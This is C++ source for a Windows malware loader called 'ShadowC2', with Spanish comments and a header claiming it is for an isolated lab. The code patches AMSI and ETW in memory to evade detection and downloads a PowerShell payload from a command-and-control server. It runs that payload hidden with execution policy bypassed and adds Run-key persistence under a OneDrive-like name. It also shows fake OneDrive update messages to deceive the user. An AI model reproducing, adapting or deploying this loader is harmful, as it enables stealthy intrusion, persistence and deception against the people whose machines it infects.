/**
 * ShadowC2 - Stealth Loader C++
 * Laboratorio de Ciberseguridad - VLAN Aislada
 * Compilar: x86_64-w64-mingw32-g++ -o OneDrive_Update.exe stealth_loader.cpp -lwininet -s -O2 -static -Wl,--subsystem,windows
 */

#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define C2_IP "192.168.1.14"
#define C2_PORT 8000
#define C2_PATH "/static/payloads/bot.ps1"

// ============ AMSI BYPASS ============
bool bypass_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;
    
    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return true;
    
    // CAST EXPLICITO para MinGW-w64
    LPVOID pAddr = (LPVOID)pAmsiScan;
    
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// ============ ETW BYPASS ============
bool bypass_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    
    // CAST EXPLICITO para MinGW-w64
    LPVOID pAddr = (LPVOID)pEtwEventWrite;
    
    BYTE patch[] = { 0xC3 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pAddr, patch, sizeof(patch));
    VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// ============ DESCARGAR PAYLOAD ============
std::vector<BYTE> download_payload() {
    std::vector<BYTE> data;
    
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (!hInternet) return data;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d%s", C2_IP, C2_PORT, C2_PATH);
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return data;
    }
    
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return data;
}

// ============ EJECUTAR POWERSHELL OCULTO ============
bool execute_payload(const std::vector<BYTE>& script) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char psPath[MAX_PATH];
    snprintf(psPath, sizeof(psPath), "%s\\sysupdate.ps1", tempPath);
    
    HANDLE hFile = CreateFileA(psPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD written;
    WriteFile(hFile, script.data(), script.size(), &written, NULL);
    CloseHandle(hFile);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \"%s\"",
        psPath);
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Persistencia en registro
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveSync", 0, REG_SZ, 
            (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
    }
    
    return result;
}

// ============ MAIN ============
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    bypass_amsi();
    bypass_etw();
    
    auto payload = download_payload();
    
    if (payload.empty()) {
        MessageBoxA(NULL, 
            "No se pudo conectar al servidor de actualizaciones.\nVerifique su conexion a internet.", 
            "OneDrive - Error de actualizacion", 
            MB_OK | MB_ICONERROR);
        return 1;
    }
    
    execute_payload(payload);
    
    MessageBoxA(NULL, 
        "OneDrive se ha actualizado correctamente.\n\nVersion: 2.4.2.1\nEstado: Protegido", 
        "OneDrive Update", 
        MB_OK | MB_ICONINFORMATION);
    
    return 0;
}
